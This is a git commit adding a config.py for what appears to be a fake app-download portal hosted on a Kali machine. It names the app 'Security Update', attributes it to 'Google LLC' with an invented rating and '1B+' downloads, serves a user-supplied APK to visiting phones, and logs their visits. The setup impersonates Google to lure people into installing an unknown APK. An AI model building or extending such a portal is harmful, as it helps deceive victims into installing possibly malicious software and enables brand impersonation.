e04a75b9aba872a08c49ce0f71e4a9d90e3c5349
mailuniversal62-hue <mailuniversal62@gmail.com>
2026-09-22 19:40:28 +0800

    Create config.py

---
+++ config.py
@@ -0,0 +1,18 @@
+# Server
+HOST = "0.0.0.0"
+PORT = 8080
+
+# The URL your phone will hit (your Kali IP)
+PUBLIC_URL = "http://192.168.100.62:8080"
+
+# Fake app details shown on the portal
+APP_NAME = "Security Update"
+APP_DEVELOPER = "Google LLC"
+APP_RATING = "4.8"
+APP_DOWNLOADS = "1B+"
+
+# APK file served for download (put your compiled APK here)
+APK_FILE = "static/app.apk"
+
+# Log file
+LOG_FILE = "logs/visits.log"
